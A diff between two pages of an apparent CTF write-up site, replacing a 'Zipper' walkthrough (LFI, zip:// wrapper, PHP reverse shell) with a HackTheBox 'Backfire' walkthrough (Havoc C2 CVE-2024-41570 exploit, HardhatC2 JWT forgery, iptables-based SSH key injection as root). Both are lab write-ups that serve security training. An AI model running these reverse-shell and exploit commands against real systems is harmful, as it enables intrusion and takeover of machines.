@@ -10,13 +10,13 @@
         <meta name="author" content="Gmrvh">
       
       
-        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/pg/zipper/">
+        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/htb/backfire/">
       
       
-        <link rel="prev" href="../flu/">
+        <link rel="prev" href="../../web/">
       
       
-        <link rel="next" href="../zenphoto/">
+        <link rel="next" href="../cypher/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -24,7 +24,7 @@
     
     
       
-        <title>Zipper - Gmvrh</title>
+        <title>Backfire - Gmvrh</title>
       
     
     
@@ -76,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#zipper-writeup" class="md-skip">
+        <a href="#initial-reconnaissance" class="md-skip">
           Skip to content
         </a>
       
@@ -112,7 +112,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Zipper
+              Backfire
             
           </span>
         </div>
@@ -323,6 +323,8 @@
                 
   
   
+    
+  
   
   
     
@@ -332,11 +334,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
@@ -352,7 +354,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_2">
             <span class="md-nav__icon md-icon"></span>
             HackTheBox
@@ -363,10 +365,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../htb/backfire/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Backfire
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -377,6 +399,105 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-via-cve-2024-41570-havoc-c2-ssrf-to-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation via CVE-2024-41570 (Havoc C2 SSRF to RCE)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-via-hardhatc2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lateral Movement via HardhatC2
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Lateral Movement via HardhatC2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-hardhatc2-via-jwt-vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting HardhatC2 via JWT Vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation to Root
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation to Root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#accessing-root-via-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Accessing Root via SSH
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -389,7 +510,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/cypher/" class="md-nav__link">
+      <a href="../cypher/" class="md-nav__link">
         
   
   
@@ -412,7 +533,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/eureka/" class="md-nav__link">
+      <a href="../eureka/" class="md-nav__link">
         
   
   
@@ -435,7 +556,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/monteverde/" class="md-nav__link">
+      <a href="../monteverde/" class="md-nav__link">
         
   
   
@@ -458,7 +579,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/sauna/" class="md-nav__link">
+      <a href="../sauna/" class="md-nav__link">
         
   
   
@@ -481,7 +602,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/timelapse/" class="md-nav__link">
+      <a href="../timelapse/" class="md-nav__link">
         
   
   
@@ -504,7 +625,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/forest/" class="md-nav__link">
+      <a href="../forest/" class="md-nav__link">
         
   
   
@@ -527,7 +648,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/cascade/" class="md-nav__link">
+      <a href="../cascade/" class="md-nav__link">
         
   
   
@@ -550,7 +671,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/blackfield/" class="md-nav__link">
+      <a href="../blackfield/" class="md-nav__link">
         
   
   
@@ -573,7 +694,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/soccer/" class="md-nav__link">
+      <a href="../soccer/" class="md-nav__link">
         
   
   
@@ -596,7 +717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../htb/jeeves/" class="md-nav__link">
+      <a href="../jeeves/" class="md-nav__link">
         
   
   
@@ -624,8 +745,6 @@
                 
   
   
-    
-  
   
   
     
@@ -635,11 +754,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
         
           
           <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
@@ -655,7 +774,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2_3">
             <span class="md-nav__icon md-icon"></span>
             ProvingGrounds
@@ -669,7 +788,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../dvr4/" class="md-nav__link">
+      <a href="../../pg/dvr4/" class="md-nav__link">
         
   
   
@@ -692,7 +811,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../shenzi/" class="md-nav__link">
+      <a href="../../pg/shenzi/" class="md-nav__link">
         
   
   
@@ -715,7 +834,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../nora/" class="md-nav__link">
+      <a href="../../pg/nora/" class="md-nav__link">
         
   
   
@@ -738,7 +857,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../catto/" class="md-nav__link">
+      <a href="../../pg/catto/" class="md-nav__link">
         
   
   
@@ -761,7 +880,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bottleup/" class="md-nav__link">
+      <a href="../../pg/bottleup/" class="md-nav__link">
         
   
   
@@ -784,7 +903,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../resourced/" class="md-nav__link">
+      <a href="../../pg/resourced/" class="md-nav__link">
         
   
   
@@ -807,7 +926,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../confusion/" class="md-nav__link">
+      <a href="../../pg/confusion/" class="md-nav__link">
         
   
   
@@ -830,7 +949,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../clue/" class="md-nav__link">
+      <a href="../../pg/clue/" class="md-nav__link">
         
   
   
@@ -853,7 +972,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../flu/" class="md-nav__link">
+      <a href="../../pg/flu/" class="md-nav__link">
         
   
   
@@ -873,32 +992,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    Zipper
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../pg/zipper/" class="md-nav__link">
         
   
   
@@ -909,161 +1006,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#initial-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Initial Enumeration
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Enumeration">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#port-scanning" class="md-nav__link">
-    <span class="md-ellipsis">
-      Port Scanning
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#system-information" class="md-nav__link">
-    <span class="md-ellipsis">
-      System Information
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#web-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Web Enumeration
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#gaining-initial-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      Gaining Initial Access
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Gaining Initial Access">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#lfi-discovery" class="md-nav__link">
-    <span class="md-ellipsis">
-      LFI Discovery
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#source-code-analysis" class="md-nav__link">
-    <span class="md-ellipsis">
-      Source Code Analysis
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#php-reverse-shell-upload" class="md-nav__link">
-    <span class="md-ellipsis">
-      PHP Reverse Shell Upload
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#shell-execution-via-zip-wrapper" class="md-nav__link">
-    <span class="md-ellipsis">
-      Shell Execution via ZIP Wrapper
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#privilege-escalation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Privilege Escalation
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Privilege Escalation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#lateral-movement-to-marcot" class="md-nav__link">
-    <span class="md-ellipsis">
-      Lateral Movement to marcot
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#lateral-movement-to-matthewa" class="md-nav__link">
-    <span class="md-ellipsis">
-      Lateral Movement to matthewa
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#root-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      Root Access
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1076,7 +1018,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../zenphoto/" class="md-nav__link">
+      <a href="../../pg/zenphoto/" class="md-nav__link">
         
   
   
@@ -1126,103 +1068,62 @@
   
 
 
-<h1 id="zipper-writeup">Zipper - Writeup</h1>
-<h2 id="initial-enumeration">Initial Enumeration</h2>
-<h3 id="port-scanning">Port Scanning</h3>
-<p>A comprehensive port scan revealed several open services:
-<div class="highlight"><pre><span></span><code>PORT    STATE SERVICE  VERSION
-22/tcp  open  ssh      OpenSSH (Unknown version)
-25/tcp  open  smtp     Postfix SMTP service
-80/tcp  open  http     Apache httpd
-443/tcp open  https    Apache httpd (SSL/TLS)
-</code></pre></div></p>
-<h3 id="system-information">System Information</h3>
-<p>Target information gathered from post-exploitation:
-<div class="highlight"><pre><span></span><code>Linux zipper 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
-</code></pre></div></p>
-<h3 id="web-enumeration">Web Enumeration</h3>
-<p>The website appeared to be a custom ZIP archiving utility that allowed users to upload multiple files and compress them into a ZIP archive. Directory scanning with feroxbuster and wfuzz revealed standard web directories.</p>
-<h2 id="gaining-initial-access">Gaining Initial Access</h2>
-<h3 id="lfi-discovery">LFI Discovery</h3>
-<p>During web enumeration, I discovered a potential Local File Inclusion (LFI) vulnerability in the application:
-<div class="highlight"><pre><span></span><code>http://192.168.162.229/index.php?file=
-</code></pre></div></p>
-<p>Testing the parameter revealed several important characteristics:
-- Regular LFI attempts did not return any content
-- Including "index" caused a 500 error, indicating an include operation was occurring
-- The URL <code>http://192.168.162.229/index.php?file=home</code> returned the home.php page
-- This suggested that the <code>.php</code> extension was being automatically appended to the file parameter</p>
-<h3 id="source-code-analysis">Source Code Analysis</h3>
-<p>Using PHP filter techniques, I was able to extract the source code of key application files:
-<div class="highlight"><pre><span></span><code>http://192.168.162.229/index.php?file=php://filter/convert.base64-encode/resource=upload
-</code></pre></div></p>
-<p>After decoding the base64 output, I discovered interesting functionality in <code>upload.php</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])</span> <span class="p">{</span>
+  <h1>Backfire</h1>
 
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
-
-        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
-        <span class="nv">$zip_name</span> <span class="o">=</span> <span class="nb">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/uploads/upload_&quot;</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;.zip&quot;</span><span class="p">;</span>
-
-        <span class="c1">// Create a zip target</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$zip_name</span><span class="p">,</span> <span class="nx">ZipArchive</span><span class="o">::</span><span class="na">CREATE</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$error</span> <span class="o">.=</span> <span class="s2">&quot;Sorry ZIP creation is not working currently.&lt;br/&gt;&quot;</span><span class="p">;</span>
-        <span class="p">}</span>
-
-        <span class="nv">$imageCount</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
-        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$imageCount</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">continue</span><span class="p">;</span>
-            <span class="p">}</span>
-            <span class="nv">$newname</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;YmdHis&#39;</span><span class="p">,</span> <span class="nb">time</span><span class="p">())</span> <span class="o">.</span> <span class="nb">mt_rand</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.tmp&#39;</span><span class="p">;</span>
-
-            <span class="c1">// Moving files to zip.</span>
-            <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">],</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]));</span>
-
-            <span class="c1">// moving files to the target folder.</span>
-            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;./uploads/&#39;</span> <span class="o">.</span> <span class="nv">$newname</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
-
-        <span class="c1">// Create HTML Link option to download zip</span>
-        <span class="nv">$success</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$zip_name</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;&lt;strong&gt;Error!! &lt;/strong&gt; Please select a file.&#39;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+<h3 id="port-enumeration">Port Enumeration</h3>
+<p>Investigating port <code>8000</code> revealed two interesting files:</p>
+<ul>
+<li><code>havoc.yaotl</code></li>
+<li><code>disable_tls.patch</code></li>
+</ul>
+<p>These files appeared to be related to a Havoc C2 listener.</p>
+<p>Inspecting <code>havoc.yaotl</code> uncovered credentials for users <code>ilya</code> and <code>sergej</code>. Despite obtaining these credentials, I was initially unable to access SSH.</p>
+<h2 id="exploitation-via-cve-2024-41570-havoc-c2-ssrf-to-rce">Exploitation via CVE-2024-41570 (Havoc C2 SSRF to RCE)</h2>
+<p>I realized there might be an SSRF to RCE vulnerability exploitable via Havoc C2. Leveraging CVE-2024-41570, I used the previously obtained credentials to exploit the server:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span>-t<span class="w"> </span>https://backfire.htb<span class="w"> </span>-i<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">40056</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;ilya&#39;</span><span class="w"> </span>-P<span class="w"> </span><span class="s1">&#39;CobaltStr1keSuckz!&#39;</span><span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.16.37<span class="w"> </span>-L<span class="w"> </span><span class="m">3001</span>
 </code></pre></div>
-<p>Key observations from the code:
-1. No file extension validation was being performed
-2. Files were being uploaded to the <code>/uploads</code> directory
-3. Each upload was also being compressed into a timestamped ZIP file</p>
-<h3 id="php-reverse-shell-upload">PHP Reverse Shell Upload</h3>
-<p>Since there were no restrictions on file extensions, I created a PHP reverse shell (<code>shell.php</code>) with the following content:
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.157/4444 0&gt;&amp;1&#39;&quot;</span><span class="p">);</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></p>
-<p>I uploaded this file through the web interface which:
-1. Stored the PHP file in the <code>/uploads</code> directory
-2. Added the file to a ZIP archive (e.g., <code>upload_1733933598.zip</code>)</p>
-<h3 id="shell-execution-via-zip-wrapper">Shell Execution via ZIP Wrapper</h3>
-<p>To execute the PHP code, I leveraged PHP's ZIP wrapper functionality along with the LFI vulnerability:
-<div class="highlight"><pre><span></span><code>http://192.168.162.229/index.php?file=zip:///var/www/html/uploads/upload_1733933598.zip%23shell
-</code></pre></div></p>
-<p>The URL breaks down as follows:
-- <code>zip://</code> - PHP's ZIP wrapper protocol
-- <code>/var/www/html/uploads/upload_1733933598.zip</code> - Path to the uploaded ZIP file
-- <code>%23shell</code> - URL-encoded <code>#</code> followed by the filename inside the ZIP (without extension)</p>
-<p>With a netcat listener ready on port 4444, this request executed my reverse shell and provided initial access as the <code>www-data</code> user.</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="lateral-movement-to-marcot">Lateral Movement to marcot</h3>
-<p>After gaining initial access as <code>www-data</code>, I ran enumeration scripts including linpeas and linenum to identify potential privilege escalation vectors.</p>
-<p>I discovered a git repository with SSH keys belonging to user <code>marcot</code>. Although the SSH key didn't work directly with any of the users, I was able to leverage information found in the repository to gain access as <code>marcot</code> through password spraying.</p>
-<h3 id="lateral-movement-to-matthewa">Lateral Movement to matthewa</h3>
-<p>From the <code>marcot</code> user, I continued enumeration and discovered credentials that allowed me to switch to the <code>matthewa</code> user.</p>
-<h3 id="root-access">Root Access</h3>
-<p>Using the process monitoring tool <code>pspy</code>, I observed a process revealing what appeared to be the root password. With this password, I was able to gain root access with <code>su root</code> and successfully complete the challenge.</p>
+<p>This successfully granted me shell access as the user <code>ilya</code>. However, the shell was unstable and frequently disconnected.</p>
+<p>To ensure a stable connection, I decided to generate an SSH key pair and authorize it for user <code>ilya</code>:</p>
+<div class="highlight"><pre><span></span><code>ssh-keygen
+<span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>ssh-agent<span class="w"> </span>-s<span class="k">)</span><span class="s2">&quot;</span>
+ssh-add<span class="w"> </span>~/.ssh/id_rsa
+cat<span class="w"> </span>~/.ssh/id_rsa.pub<span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
+chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>~/.ssh/authorized_keys
+chmod<span class="w"> </span><span class="m">700</span><span class="w"> </span>~/.ssh
+</code></pre></div>
+<p>After this, I was able to log in reliably via SSH:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>ilya@backfire.htb<span class="w"> </span>-i<span class="w"> </span>~/.ssh/id_rsa
+</code></pre></div>
+<h2 id="lateral-movement-via-hardhatc2">Lateral Movement via HardhatC2</h2>
+<p>While enumerating accessible ports and files, I noticed evidence indicating user <code>sergej</code> was running a HardhatC2 server. I suspected this might be leveraged for lateral movement.</p>
+<p>To interact with HardhatC2, I performed SSH port forwarding:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">7096</span>:localhost:7096<span class="w"> </span>-L<span class="w"> </span><span class="m">5000</span>:localhost:5000<span class="w"> </span>-L<span class="w"> </span><span class="m">40056</span>:localhost:40056<span class="w"> </span>ilya@backfire.htb<span class="w"> </span>-i<span class="w"> </span>~/.ssh/id_rsa
+</code></pre></div>
+<p>Port <code>7096</code> was identified as the login panel for HardhatC2.</p>
+<h3 id="exploiting-hardhatc2-via-jwt-vulnerability">Exploiting HardhatC2 via JWT Vulnerability</h3>
+<p>I found an article detailing how static JWT keys in HardhatC2 could be exploited to create an administrator account:</p>
+<ul>
+<li>Reference: <a href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">HardhatC2 0-days RCE &amp; Auth Bypass</a></li>
+</ul>
+<p>Following the provided script, I successfully forged an admin JWT and gained access to the HardhatC2 administrative interface. From there, I executed commands using the terminal functionality in the implants section.</p>
+<p>Again, I added my SSH key for stable access, this time for user <code>sergej</code>.</p>
+<h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
+<p>Checking <code>sergej</code>'s privileges revealed the ability to execute SUID binaries <code>iptables</code> and <code>iptables-save</code> as root. Given this capability, I attempted to escalate privileges by injecting my SSH key using iptables comments and saving these rules directly into the root’s authorized SSH keys.</p>
+<p>Initially, overwriting <code>/etc/passwd</code> and <code>/etc/passwd.bak</code> wasn't effective because a cron job reverted changes. Instead, I focused on injecting an SSH key directly:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>/usr/sbin/iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-i<span class="w"> </span>lo<span class="w"> </span>-m<span class="w"> </span>comment<span class="w"> </span>--comment<span class="w"> </span><span class="s1">$&#39;\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkuGVr+yFcYjNBCeizGyvCbi7x0vBFoVO7sjqhy0SXl gg@pop-os\n&#39;</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+sudo<span class="w"> </span>iptables-save<span class="w"> </span>-f<span class="w"> </span>/root/.ssh/authorized_keys
+</code></pre></div>
+<p>This successfully injected my SSH key into the root user's authorized keys file.</p>
+<h3 id="accessing-root-via-ssh">Accessing Root via SSH</h3>
+<p>With my key injected, I logged in as root:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>root@backfire.htb<span class="w"> </span>-i<span class="w"> </span>~/.ssh/id_ed25519
+</code></pre></div>
+<p>Now with full access, I verified the privilege escalation was successful:</p>
+<div class="highlight"><pre><span></span><code>root@backfire:~#<span class="w"> </span>ls
+a.txt<span class="w">  </span>root.txt
+</code></pre></div>
+<p>This concluded my successful compromise and privilege escalation of the target.</p>
 
 
 
